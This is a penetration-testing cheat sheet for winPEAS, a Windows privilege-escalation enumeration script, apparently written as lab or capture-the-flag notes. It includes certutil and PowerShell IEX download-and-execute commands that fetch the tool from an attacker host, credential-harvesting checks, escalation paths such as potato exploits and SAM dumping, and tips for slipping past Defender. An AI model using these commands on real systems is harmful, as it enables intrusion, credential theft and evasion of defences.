# winpeas — Windows Privilege Escalation Awesome Script

> **linpeas' Windows sibling.** Enumerates services, registry, installed apps, creds, AutoRuns, AlwaysInstallElevated, unquoted services, DLL hijack candidates.

**Get it:** releases at https://github.com/peass-ng/PEASS-ng/releases — pick `winPEAS.exe` (full), `winPEAS.bat` (no-deps), or `winPEASany_ofs.exe` (obfuscated).

---

## 🎯 Cheat-flow

```cmd
:: Transfer to target
certutil -urlcache -f http://10.10.14.5/winPEASx64.exe winpeas.exe
.\winpeas.exe

:: PowerShell download
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/winPEAS.ps1')

:: Batch variant (no deps, runs everywhere)
winPEAS.bat
```

Module selection:
```cmd
winpeas.exe systeminfo userinfo
winpeas.exe -h                    :: all modules
winpeas.exe quiet                 :: no banner
winpeas.exe nocolor
winpeas.exe log=out.txt           :: save to file
winpeas.exe fast                  :: skip slow checks
```

---

## 🔑 Modules

| Keyword | Checks |
|---|---|
| `systeminfo` | OS, hotfixes, env, audit, UAC, LAPS, LSA protection |
| `userinfo` | Users, groups, privileges, token, sessions |
| `processinfo` | Running procs, parents |
| `servicesinfo` | **Unquoted paths, writable services, weak perms** |
| `applicationsinfo` | Installed software versions → known CVEs |
| `networkinfo` | Interfaces, listening ports, firewall, hosts |
| `windowscreds` | Credential manager, vault, WiFi profiles, unattend, SAM, SYSVOL |
| `browserinfo` | Browser creds, history, bookmarks |
| `filesinfo` | Interesting files, recent docs |
| `eventsinfo` | Security events |

---

## 🎨 What to look for

| Finding | Why it matters |
|---|---|
| **AlwaysInstallElevated = 1** | Instant SYSTEM via MSI |
| **Unquoted service path** with writable intermediate dir | Drop a binary, restart service |
| **Modifiable service binary/config** | Replace and restart |
| **AutoLogon password in registry** | Plaintext creds |
| **SAM / SYSTEM / SECURITY readable** | Offline hash dump with [impacket](impacket.md) secretsdump |
| **GPP cpassword in SYSVOL** | Decrypt with gpp-decrypt |
| **SeImpersonatePrivilege** | JuicyPotato / PrintSpoofer / RoguePotato → SYSTEM |
| **SeBackupPrivilege** | Read any file, dump SAM |

---

## ⚠️ Gotchas

- **Defender eats winpeas.exe** on sight. Use `winPEASany_ofs.exe` (obfuscated), or run the `.bat` variant which has no signature.
- Full exe run takes ~1–3 minutes and produces massive output — save to file: `winpeas.exe log=peas.txt`.
- Prefer the x64 binary on 64-bit Windows (x86 shows less info in WOW64).
- For AD context follow up with [crackmapexec](crackmapexec.md) and BloodHound.

---

## 🔗 Related

- [linpeas](linpeas.md) · [mimikatz](mimikatz.md) · [crackmapexec](crackmapexec.md) · [impacket](impacket.md)
